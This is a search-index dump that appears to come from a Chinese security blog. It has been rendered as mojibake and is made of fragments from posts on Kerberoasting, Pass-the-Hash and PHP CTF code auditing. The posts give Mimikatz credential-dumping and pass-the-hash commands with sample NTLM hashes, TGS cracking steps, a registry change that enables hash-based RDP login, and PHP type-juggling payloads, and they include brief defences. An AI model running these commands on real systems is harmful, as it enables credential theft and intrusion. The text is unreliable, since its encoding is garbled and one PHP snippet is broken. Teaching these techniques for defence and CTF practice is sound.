Serviceï¼Œåˆ™ SPN æ³¨å†Œåœ¨æœºå™¨å¸æˆ·(Computers)ä¸‹ å½“ä¸€ä¸ªæœåŠ¡çš„æƒé™ä¸ºä¸€ä¸ªåŸŸç”¨æˆ·ï¼Œåˆ™ SPN æ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹ SPN çš„æ ¼å¼ä¸º serviceclass/host:port/servicename å…¶ä¸­ serviceclass è¡¨ç¤ºæœåŠ¡çš„ç§ç±»ï¼Œä¾‹å¦‚ www è¡¨ç¤ºwebæœåŠ¡; host å°½é‡ç”¨ FQDN è¡¨ç¤º; ç«¯å£å¦‚æœæ˜¯çŸ¥åç«¯å£ï¼Œå¯ä»¥çœç•¥ã€‚ ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:4:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Kerberoasting æ”»å‡»","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4.2 æŸ¥è¯¢ SPN SPN å­˜åœ¨äºè´¦å·çš„å±æ€§ä¸­ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æŸ¥è¯¢æ‰€æœ‰è´¦å·çš„å±æ€§ï¼Œéå†åŸŸå†…æ‰€æœ‰ SPN æœåŠ¡ã€‚å› ä¸ºä¸»æœºè´¦å·çš„å£ä»¤å‡ ä¹ä¸èƒ½ç ´è§£ï¼Œæ‰€ä»¥åªæŸ¥è¯¢ç”¨æˆ·è´¦å·çš„ SPNã€‚ ç³»ç»Ÿæä¾›äº† PowerShell æ¨¡å—ä¾›æŸ¥è¯¢ï¼ŒPowerViewer å¯¹æ¨¡å—è¿›è¡Œäº†å°è£…ï¼Œæä¾› Get-DomainUser -SPN å‘½ä»¤ï¼Œå¯éå†åŸŸå†…æ‰€æœ‰çš„ç”¨æˆ·è´¦å·çš„ SPNã€‚ Win7 å’Œ Windows Server 2008 è‡ªå¸¦çš„å·¥å…· setspn.exe -q */* åœ¨ä¸€äº›åŸŸä¸­ï¼Œå½“ä¸€äº›æœåŠ¡ä¸å†è¿è¡Œæˆ–è€…åœæ­¢æœåŠ¡åï¼Œè¿™äº›æœåŠ¡è´¦å·å¯èƒ½ä»ç„¶é—ç•™åœ¨åŸŸä¸­ï¼Œç”±äºæœåŠ¡çš„è¿è¡Œä¸å¦ä¸å½±å“æˆ‘ä»¬è·å– TGSï¼Œå› æ­¤è¿™äº›ä¸å­˜åœ¨çš„ SPN ä»ç„¶é€‚ç”¨äº Kerberoastingã€‚ æœåŠ¡è´¦å·ä¸­æœ‰äº›æƒé™è¾ƒé«˜ï¼Œä¾‹å¦‚æœ‰äº›ç‰¹æ®Šçš„æœåŠ¡éœ€è¦å…·å¤‡åŸŸç®¡ç†å‘˜æƒé™çš„æœåŠ¡è´¦å·æ‰èƒ½è¿è¡Œæ­£å¸¸ï¼Œå› æ­¤å¯ä»¥åœ¨æŸ¥è¯¢ SPN æ—¶åŠ ä»¥æ ‡è®°å’Œç­›é€‰ï¼Œä½œä¸ºé‡ç‚¹æ”»å‡»çš„å¯¹è±¡ã€‚æ–¹æ³•æ˜¯åœ¨ä½¿ç”¨ Get-DomainUser -SPN å‘½ä»¤æ—¶ï¼Œæ·»åŠ  AdminCount å‚æ•°ï¼Œè¡¨ç¤ºå…·å¤‡é«˜æƒé™ã€‚ ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:4:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Kerberoasting æ”»å‡»","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"5 æ”»å‡»æµç¨‹ è·å–åŸŸå†…çš„æœåŠ¡è´¦å·ä¸æ‰€è¿è¡Œçš„æœåŠ¡è¿›è¡Œå¯¹åº”å…³ç³» éœ€è¦è·å–è®¿é—®è¿™äº›æœåŠ¡çš„ TGSï¼Œä»è€Œè·å–ç”±æœåŠ¡è´¦å· NTLM åŠ å¯†çš„åŠ å¯†æ•°æ® Mimikatz æä¾›äº†è¯¥åŠŸèƒ½ï¼Œé€šè¿‡ Kerberos æ¨¡å—çš„ ask å‘½ä»¤å¯ä»¥è·å–ã€‚ ä½¿ç”¨ Mimikatz æ¯æ¬¡åªèƒ½ç”³è¯·è·å–ä¸€ä¸ª TGSï¼Œimpacket å·¥å…·åŒ…æä¾›äº†æ‰¹é‡è·å–çš„æ–¹æ³•ï¼Œå¯ä¸€æ¬¡è·å–åŸŸå†…æ‰€æœ‰ SPN çš„ TGSï¼Œä¾›ç¦»çº¿æ‰¹é‡ç ´è§£ã€‚ å¾®è½¯ä¸ºäº†è§£å†³ç³»ç»Ÿæ–°æ—§ç‰ˆæœ¬å…¼å®¹æ€§é—®é¢˜ï¼Œæ¯ä¸ª Windows ç³»ç»Ÿä¼šæ”¯æŒå¤šç§åŠ å¯†ç®—æ³•ï¼Œä¾‹å¦‚ AESã€DESã€RC4ã€MD5 ç­‰ã€‚åœ¨ Windows 2003ã€Windows 2000 ç³»ç»Ÿä¸­ï¼Œä¸»è¦é‡‡ç”¨ RC4ã€MD5ã€HMAC_MD5 ç­‰ç®—æ³•ï¼Œè¿™äº›ç®—æ³•ç›¸å¯¹æ¯”è¾ƒå®¹æ˜“ç ´è§£ã€‚æ‰€ä»¥åœ¨é€‰æ‹©ç ´è§£é‡ç‚¹æ—¶å°½é‡é€‰å–è¿è¡Œåœ¨è¿™äº›ç³»ç»Ÿä¸Šçš„æœåŠ¡ æœ‰å¤šç§æ–¹å¼è¿«ä½¿ç³»ç»Ÿé€‰æ‹©ä½¿ç”¨å¼ºåº¦è¾ƒä½çš„åŠ å¯†ç®—æ³•ã€‚ç°åœ¨æ¯”è¾ƒå®¹æ˜“ç ´è§£çš„ç®—æ³•æ˜¯ RC4_HMAC_NT ç®—æ³•ï¼Œåœ¨è·å– TGS æ—¶ï¼Œå¯ä»¥è¯±ä½¿åŸŸæœåŠ¡å™¨é‡‡ç”¨è¯¥ç®—æ³•è¿›è¡ŒåŠ å¯†ã€‚ Kerberoasting æ”»å‡»çš„æ‰€æœ‰æ¡ä»¶ å¯†æ•°æ® ç®—æ³• å£ä»¤å­—å…¸åº“ ä½¿ç”¨ Tim Medin çš„ kerberoast å·¥å…·ç ´è§£è·å–å£ä»¤ï¼Œå½“ç„¶è¿˜æœ‰ç®—æ³•æ›´å¿«çš„ HashCat å·¥å…·ã€‚ä¸‹è½½è§£å‹ kerberoast å·¥å…·åï¼Œä½¿ç”¨ tgsrepcrack.py wordlist.txt tgs.kirbi è¿›è¡Œç ´è§£ï¼Œå…¶ä¸­ wordlist.txt æ˜¯å­—å…¸æ–‡ä»¶ï¼Œtgs.kirbi æ˜¯å‰é¢è·å–çš„ TGSã€‚ç ´è§£çš„æ¦‚ç‡å’Œæ—¶é—´ä¾èµ–äºå£ä»¤å¤æ‚åº¦ã€å­—å…¸ä»¥åŠæœºå™¨çš„æ€§èƒ½ã€‚ ./tgsrepcrack.py wordlist.txt test.kirbi ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:5:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Kerberoasting æ”»å‡»","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"6 é˜²å¾¡ Kerberoasting æ”»å‡»çš„ä¸»è¦å‰ææ˜¯å£ä»¤å¤æ‚åº¦è¾ƒä½ã€åŠ å¯†ç®—æ³•å¼ºåº¦è¾ƒå¼± å¯¹æŠ— Kerberoasting æ”»å‡»ä¹Ÿéœ€ä»è¿™ 2 æ–¹é¢å¼€å±• æé«˜æœåŠ¡è´¦å·çš„å£ä»¤å¤æ‚åº¦; å°½é‡å°†åŸŸå†…çš„æœåŠ¡å™¨ç³»ç»Ÿå‡çº§è‡³å°‘è‡³ windows2008 ç³»ç»Ÿï¼Œåº”ç”¨ AES256 é«˜éš¾åº¦çš„åŠ å¯†ç®—æ³• æ£€æµ‹ Kerberoasting æ”»å‡»æ¯”è¾ƒéš¾ï¼Œå› ä¸ºæ‰€æœ‰åœ¨çº¿æ“ä½œéƒ½æ˜¯åˆæ³•æ­£å¸¸çš„æ“ä½œï¼Œä¸è¿‡ä»ç„¶æœ‰è¿¹å¯å¾ªã€‚ä¾‹å¦‚æ‰¹é‡è·å– TGS æ˜¯ä¸€ä¸ªç‰¹å¾ï¼Œä½å¼ºåº¦çš„åŠ å¯†ç®—æ³•æ˜¯ä¸€ä¸ªç‰¹å¾ï¼Œå¯ä»¥ä»è¿™ä¸¤æ–¹é¢ç€æ‰‹è¿›è¡Œæ£€æµ‹æ˜¯æ¯”è¾ƒæœ‰æ•ˆçš„æ£€æµ‹æ€è·¯ã€‚ ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:6:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Kerberoasting æ”»å‡»","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"PTH(Pass The Hash) æ”»å‡»åŸç†åŠå®éªŒ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"PTH(Pass The Hash) æ”»å‡»åˆ†æ","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"PTH(Pass The Hash) æ”»å‡» ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"PTH(Pass The Hash) æ”»å‡»åˆ†æ","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1 æ¦‚è¿° è·å–ä¸€å°ä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜ç»„æˆå‘˜è´¦å·çš„å£ä»¤ NTLM åï¼Œä¸éœ€ç ´è§£è·å–å£ä»¤æ˜æ–‡ï¼Œä½¿ç”¨ PTH æ–¹å¼ï¼Œå°†ç®¡ç†å‘˜è´¦å·åŠ NTLM æ³¨å…¥å½“å‰ä¼šè¯ä½œä¸ºå‡­æ®ï¼Œåˆ©ç”¨è¯¥å‡­è¯å¯ä»¥æ¸—é€è·å–å‘¨å›´ä¸»æœºçš„ç®¡ç†æƒé™ å¯¹æ–¹ä¸»æœºéœ€å­˜åœ¨ç›¸åŒçš„è´¦å·ï¼Œä¸”æ˜¯ç®¡ç†å‘˜ç»„æˆå‘˜ åœ¨ Windows NT 5.x ç³»ç»Ÿä¸­ï¼Œç®¡ç†å‘˜ç»„è´¦å·çš„ç½‘ç»œç™»å½•å‡èƒ½è·å–ç³»ç»Ÿç®¡ç†æƒ åœ¨ Windows NT 6.x ç³»ç»ŸåŠæ›´é«˜çš„ç‰ˆæœ¬ä¸­ï¼Œç®¡ç†å‘˜ç»„(SIDé500)è´¦å·çš„ç½‘ç»œç™»å½•ä¸èƒ½è·å–ç³»ç»Ÿç®¡ç†æƒé™ï¼Œadministrator(SIDä¸º500)è´¦å·çš„ç½‘ç»œç™»å½•èƒ½è·å–ç³»ç»Ÿç®¡ç†æƒ è¿™ç±»æ”»å‡»é€‚ç”¨äºï¼š åŸŸ/å·¥ä½œç»„ç¯å¢ƒ å¯ä»¥è·å¾— hashï¼Œä½†æ˜¯æ¡ä»¶ä¸å…è®¸å¯¹ hash çˆ†ç ´ å†…ç½‘ä¸­å­˜åœ¨å’Œå½“å‰æœºå™¨ç›¸åŒçš„å¯†ç  ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"PTH(Pass The Hash) æ”»å‡»åˆ†æ","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2 UAC ç”¨æˆ·å¸æˆ·æ§åˆ¶ (User Account Control) æ˜¯ Windows Vistaï¼ˆåŠæ›´é«˜ç‰ˆæœ¬æ“ä½œç³»ç»Ÿï¼‰ä¸­ä¸€ç»„æ–°çš„åŸºç¡€ç»“æ„æŠ€æœ¯ï¼Œå¯ä»¥å¸®åŠ©é˜»æ­¢æ¶æ„ç¨‹åºï¼ˆæœ‰æ—¶ä¹Ÿç§°ä¸º\"æ¶æ„è½¯ä»¶\"ï¼‰æŸåç³»ç»Ÿï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å¸®åŠ©ç»„ç»‡éƒ¨ç½²æ›´æ˜“äºç®¡ç†çš„å¹³å°ã€‚ ä½¿ç”¨ UACï¼Œåº”ç”¨ç¨‹åºå’Œä»»åŠ¡æ€»æ˜¯åœ¨éç®¡ç†å‘˜å¸æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œä½†ç®¡ç†å‘˜ä¸“é—¨ç»™ç³»ç»Ÿæˆäºˆç®¡ç†å‘˜çº§åˆ«çš„è®¿é—®æƒé™æ—¶é™¤å¤–ã€‚UAC ä¼šé˜»æ­¢æœªç»æˆæƒåº”ç”¨ç¨‹åºçš„è‡ªåŠ¨å®‰è£…ï¼Œé˜²æ­¢æ— æ„ä¸­å¯¹ç³»ç»Ÿè®¾ç½®è¿›è¡Œæ›´æ”¹ã€‚ ç”¨æˆ·å¸æˆ·æ§åˆ¶(UAC)æ˜¯æ–°ç‰ˆ Windows çš„æ ¸å¿ƒå®‰å…¨åŠŸèƒ½ï¼Œä¹Ÿæ˜¯å…¶æœ€å¸¸è¢«äººè¯¯è§£çš„ä¼—å¤šå®‰å…¨åŠŸèƒ½å½“ä¸­çš„ä¸€ç§ã€‚ HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\FilterAdministratorTokenï¼ŒUACå°±æ˜¯é€šè¿‡ä¸Šé¢çš„æ³¨å†Œè¡¨é”®å€¼æ¥åˆ¤æ–­ï¼Œé»˜è®¤è®¾ç½®ä¸º 0ã€‚å¦‚æœè®¾ç½®ä¸º 1ï¼Œåˆ™ SID ä¸º 500 çš„ç®¡ç†å‘˜ä¹Ÿä¸èƒ½é€šè¿‡ç½‘ç»œç™»å½•çš„æ–¹å¼è·å–é«˜æƒé™ã€‚ HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicyï¼Œå¦‚æœåœ¨æ³¨å†Œè¡¨ä¸­æœ‰è¿™ä¸ªé”®å€¼ï¼Œå¹¶ä¸”è®¾ç½®ä¸º 1ï¼Œåˆ™æ‰€æœ‰çš„ç®¡ç†ç»„æˆå‘˜éƒ½å¯ä»¥é€šè¿‡ç½‘ç»œç™»å½•è·å–é«˜æƒé™ã€‚ä¸”ç®¡ä¸Šé¢çš„ä¸€ä¸ªè¡¨é¡¹ FilterAdministratorToken çš„å€¼ã€‚ ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"PTH(Pass The Hash) æ”»å‡»åˆ†æ","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3 æ”»å‡» mimikatz çš„ pth åŠŸèƒ½éœ€è¦æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼Œè¿™æ˜¯ç”±å®ƒçš„å®ç°æœºåˆ¶å†³å®šçš„ï¼Œéœ€è¦å…ˆè·å¾—é«˜æƒé™è¿›ç¨‹ lsass.exe çš„ä¿¡æ¯ å¯¹äº 8.1/2012r2ï¼Œå®‰è£…è¡¥ä¸KB2871997 çš„ Win 7/2008r2/8/2012ï¼Œå¯ä»¥ä½¿ç”¨ AES keys ä»£æ›¿ NT hash ä½¿ç”¨ mimikatz å…ˆè·å– hash: privilege::debug sekurlsa::logonpasswords å¾—åˆ° hash å ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"PTH(Pass The Hash) æ”»å‡»åˆ†æ","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3.1 å·¥ä½œç»„ sekurlsa::pth /user:administrator /domain:workgroup /ntlm:ccef208c6485269c20db2cad21734fe7 å¾®è½¯ä¹Ÿå¯¹ pth æ‰“è¿‡è¡¥ä¸ï¼Œç„¶è€Œåœ¨æµ‹è¯•ä¸­å‘ç°ï¼Œåœ¨æ‰“äº†è¡¥ä¸åï¼Œå¸¸è§„çš„ Pass The Hash å·²ç»æ— æ³•æˆåŠŸï¼Œå”¯ç‹¬é»˜è®¤çš„ Administrator (SID 500) è´¦å·ä¾‹å¤–ï¼Œåˆ©ç”¨è¿™ä¸ªè´¦å·ä»å¯ä»¥è¿›è¡Œ Pass The Hash è¿œç¨‹ ipc è¿æ¥ã€‚ ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:3:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"PTH(Pass The Hash) æ”»å‡»åˆ†æ","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3.2 åŸŸå†…ç”¨æˆ· å‰ææ˜¯ï¼šåŸŸç”¨æˆ·ä¸ºæœ¬åœ°ç®¡ç†ç»„æˆå‘˜ sekurlsa::pth /user:eviluser /domain:adsec.com /ntlm:ccef208c6485269c20db2cad21734fe7 åŸŸå†…ç”¨æˆ·ä¸å—è¡¥ä¸å½±å“ã€‚ ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:3:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"PTH(Pass The Hash) æ”»å‡»åˆ†æ","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4 KB2871997 Changes to this feature include: prevent network logon and remote interactive logon to domain-join ed machine using local accountsâ€¦ å®‰è£… KB2871997 è¡¥ä¸åï¼Œå…¶ä»–æ–¹é¢å¹¶æ²¡æœ‰å¤ªå¤šçš„å˜åŒ– ã€‚è¡¥ä¸ä¼šç»™æœ¬åœ°è´¦å·æ·»åŠ ä¸€ä¸ª S-1-5-113 çš„ SIDï¼Œä¸ºç®¡ç†ç»„ä¸­çš„æœ¬åœ°è´¦å·æ·»åŠ ä¸€ä¸ª S-1-5-114 çš„ SIDï¼Œè¿™æ ·æ–¹ä¾¿é€šè¿‡åŸŸç­–ç•¥è¿›è¡Œç®¡ç†ï¼Œä¾‹å¦‚ä»åŸŸç­–ç•¥ä¸­å…¨é¢ç¦æ­¢è¿™ç±»è´¦å·çš„ç½‘ç»œç™»å½•ã€‚ ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"PTH(Pass The Hash) æ”»å‡»åˆ†æ","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"5 é’ˆå¯¹ RDP çš„ hash ä¼ é€’æ”»å‡» è¯´èµ· hash ä¼ é€’æ”»å‡»ï¼ˆpthï¼‰ï¼Œæƒ³åˆ°ä¸€èˆ¬çš„éƒ½æ˜¯ psexec wce mimikatz ç­‰ç›´æ¥æ‰§è¡Œå‘½ä»¤ã€‚ æœ¬èŠ‚ç»äº†ä¸€ç§åˆ©ç”¨ mimikatz + NThash æ¥å¯åŠ¨ mstsc.exe å®ç°è¿œç¨‹ç™»é™† windows æ¡Œé¢çš„æ–¹æ³•ï¼Œå¯¹ä¸èƒ½æ‰§è¡Œå‘½ä»¤åˆç ´è§£ä¸å‡ºå¯†ç çš„ç¯å¢ƒæœ‰å¾ˆå¤§çš„å¸®åŠ©ã€‚ å…¶åŸç†ï¼ˆæ¡ä»¶ï¼‰æ˜¯è¿œç¨‹ç›®æ ‡éœ€è¦ä½¿ç”¨å—é™ç®¡ç†æ¨¡å¼ï¼ˆRestricted Admin Modeï¼‰ï¼Œå› ä¸ºæ­¤æ¨¡å¼ä¸‹æ”¯æŒ kerberos è®¤è¯ï¼Œæ‰€ä»¥èƒ½ä½¿ç”¨ hash æ¥ç™»é™†ã€‚ sekurlsa::pth /user:\u003cuser name\u003e /domain:\u003cdomain name\u003e /ntlm:\u003cthe user's ntlm hash\u003e /run:\"mstsc.exe /restrictedadmin\" å¦‚æœå—é™ç®¡ç†æ¨¡å¼è¢«ç¦ç”¨ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¼€å¯ï¼š mimikatz.exe \"sekurlsa::pth /user:\u003cuser name\u003e /domain:\u003cdomain name\u003e /ntlm:\u003cthe user's ntlm hash\u003e /run:powershell.exe\" åœ¨å¼¹å‡ºçš„ powershell çª—å£ä¿®æ”¹æ³¨å†Œè¡¨ï¼š Enter-PSSession -Computer \u003cTarget\u003e New-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name \"DisableRestrictedAdmin\" -Value \"0\" -PropertyType DWORD -Force ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:5:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"PTH(Pass The Hash) æ”»å‡»åˆ†æ","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"6 é˜²å¾¡ HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\ Windows\\CurrentVersion\\Policies\\System\\FilterAdministratorTokenï¼Œç³»ç»Ÿä¸­ä¸€ä¸ªæœ‰ Admin ApprovalModeï¼ŒUAC å°±æ˜¯é€šè¿‡ä¸Šé¢çš„æ³¨å†Œè¡¨é”®å€¼æ¥åˆ¤æ–­ï¼Œé»˜è®¤è®¾ç½®ä¸º 0ã€‚å¦‚æœè®¾ç½®ä¸º 1ï¼Œåˆ™ SID ä¸º 500 çš„ç®¡ç†å‘˜ä¹Ÿä¸èƒ½é€šè¿‡ç½‘ç»œç™»å½•çš„æ–¹å¼è·å–é«˜æƒé™ã€‚ ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:6:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"PTH(Pass The Hash) æ”»å‡»åˆ†æ","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡ç›¸å…³æ•´ç†","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡ ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:0:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"1 PHP å¼±ç±»å‹é—®é¢˜ ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"1.1 åŸç† åŒç­‰äºå·ï¼š å¦‚æœç±»å‹è½¬æ¢å $a ç­‰äº $b ä¸‰ç­‰äºå·ï¼š å…¨ç­‰äº True å¦‚æœ $a ç­‰äº $bï¼Œå¹¶ä¸”å®ƒä»¬çš„ç±»å‹ä¹Ÿç›¸åŒ å¦‚æœä¸€ä¸ªæ•°å€¼å’Œä¸€ä¸ªå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œé‚£ä¹ˆä¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆæ•°å€¼ å¸¸è§çš„æ¯”è¾ƒç»“æœï¼š '' == 0 == false '123' == 123 'abc' == 0 '123a' == 123 '0x01' == 1 '0e123456789' == '0e987654321' false == 0 == NULL == '' NULL == false == 0 true == 1 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"title":"CTF ä¸­çš„ PHP ä»£ç å®¡è®¡","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ä»£ç å®¡è®¡"],"content":"1.2 å®ä¾‹ 1.2.1 MD5 ç­‰ hash å‡½æ•°ç›¸å…³é¢˜ç›® 1.2.1.1 DEMO 1 Payloadï¼šurl?param1=QNKCDZO\u0026param2=aabg7XSs 1.2.2.2 DEMO 2 Payloadï¼šurl?param1[]=1\u0026param2[]= 1.2.2.3 DEMO 3 ç»è¿‡ String å¼ºåˆ¶ç±»å‹è½¬æ¢åï¼Œå½“ä¼ å…¥æ•°ç»„æ—¶ï¼Œè¿”å›å€¼ä¸º Array failï¼Œæ— æ³•ç»•è¿‡ï¼Œå› æ­¤ï¼Œé‡‡ç”¨ MD5 ç¢°æ’çš„å½¢å¼ã€‚ å·¥å…·ï¼šfastcoll Payloadï¼š 1.2.2.4 DEMO 4 Payloadï¼šurl?name[]=1\u0026password[]= 1.2.2.5 DEMO 5 - MD5 ä¸ SQL æ³¨å…¥çš„èåˆ Payloadï¼šurl?password=ffifdyop 1.2.2 JSON ç›¸å…³é¢˜ç›® \u003c?php highlight_file(__FILE__); include \"flag.php\"; if(isset($_POST['message'])) { $message = json_decode(_$POST['message']); if($message-\u003ekey == $key) { echo $flag; } else { echo \"fail\"; } } else { echo \"~~~~\"; } ?\u003e åŸç†ï¼šå­—ç¬¦ä¸² flag{xxx} å’Œæ•°å­— 0 æ¯”è¾ƒï¼Œç»“æœä¸º True Payloadï¼šurl?message={\"key\":0} 1.2.3 SWITCH ç›¸å…³é¢˜ç›® åŸç†ï¼šå¦‚æœ switch æ˜¯æ•°å­—ç±»å‹çš„ case åˆ¤æ–­æ—¶ï¼Œswitch ä¼šå°†å…¶ä¸­çš„å‚æ•°è½¬æ¢ä¸º int ç±»å‹ã€‚switch åˆ¤æ–­æ—¶ä¸ºåŒç­‰äºç±»å‹ \u003c?php highlight_file(__FILE__); $i = \"3nanme\"; switch ($i) { case 0: case 1: case 2: echo \"this is two\"; break; case 3: echo \"flag\"; break; } ?\u003e 1.2.4 STRCMP ç›¸å…³é¢˜ç›® åŸç†ï¼šåˆ©ç”¨ strcmp ä¸­çš„å‚æ•°ä¸ºæ•°ç»„ï¼Œè¿”å›å€¼ä¸º NULLï¼Œåœ¨éä¸¥æ ¼æ¯”è¾ƒçš„æƒ…å†µä¸‹ä¸ 0 ç›¸ç­‰ã€‚ \u003c?php highlight_file(__FILE__); include \"flag.php\"; if(isset($_POST['password'])) { if(strcmp($_POST['password'], $password) == 0) { echo \"Right!!!login success\"; echo $flag; exit(); } else { echo \"Wrong password..\"; } } ?\u003e Payloadï¼šurl?password[]= 1.2.5 in_array å‡½æ•° \u003c?php highlight_file(__FILE__); $array=[0, 1, 2, '3']; var_dump(in_array('abc', $array)); var_dump(in_array('1bc', $array)); var_dump(in_array(3, $array)); è¿”å›ç»“æœä¸ºï¼štrueã€trueã€true 1.2.6 array_search å‡½æ•° åœ¨æ•°ç»„ä¸­æœç´¢ç»™å®šçš„å€¼ï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›é¦–ä¸ªç›¸åº”çš„é”®åã€‚ \u003c?php highlight_file(__FILE__); $array=[0, 1, 2, '3']; var_dump(array_search('abc', $array)); 